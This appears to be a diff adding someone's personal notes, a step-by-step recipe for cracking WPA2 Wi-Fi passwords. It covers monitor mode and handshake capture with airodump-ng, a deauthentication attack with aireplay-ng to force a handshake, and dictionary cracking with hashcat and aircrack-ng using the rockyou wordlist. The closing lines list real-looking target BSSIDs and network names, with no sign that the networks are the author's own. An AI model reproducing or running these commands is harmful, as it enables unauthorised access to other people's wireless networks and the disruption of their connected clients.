@@ -1,0 +1,34 @@
+1 - sudo airmon-ng start wlan0
+2 - sudo airodump-ng mon0/wlan0
+3 - note teh MAC and channel of the Wifi you want to crack
+4 - sudo airodump-ng -c channel --bssid MAC -w /home/paulo/Desktop/WIFImv wlan0/mon0
+5 - mv ./-01.cap name.cap  -change the file name to be eaiser to find
+6 - sudo /home/paulo/Downloads/hashcat-utils-1.9/src/cap2hccapx.bin MBroker.cap Mbroker.hccapx
+Do it only once
+    sudo git clone https://github.com/brannondorsey/naive-hashcat
+    cd naive-hashcat
+    curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+7 - HASH_FILE=name.hccapx POT_FILE=name.pot HASH_TYPE=2500 ./naive-hashcat.sh
+
+Downloading a disctorary list
+    curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+Cracking with aircrack-ng
+1 - aircrack-ng -a2 -b MAC -w rockyou.txt name.cap
+
+
+
+Deauth Attacks to force a handshake
+1 - airodump-ng -c channel --bssid MAC -w /home/paulo/Desktop/WIFI wlan0
+Open another terminal
+2 - aireplay-ng -0 2 -a MAC1 -c MAC2 mon0/wlan0 - MAC1 left MAC and MAC2 right MAC
+Once you see the handshake address tag it and continue with the step 6
+
+
+AC:3B:77:AC:F3:1E  -31       23       12    0   6  540   WPA2 CCMP   PSK  MBroker
+handShake AC:3B:77:AC:F3:1E 
+
+aircrack-ng -a2 -b F8:1D:0F:AF:00:B8 -w /home/paulo/Desktop/naive-hashcat/rockyou-air.txt /home/paulo/Desktop/WIFI/Lulu.cap
+
+C8:D7:19:2B:DF:01
+
+F8:1D:0F:AF:00:B8 -c 6
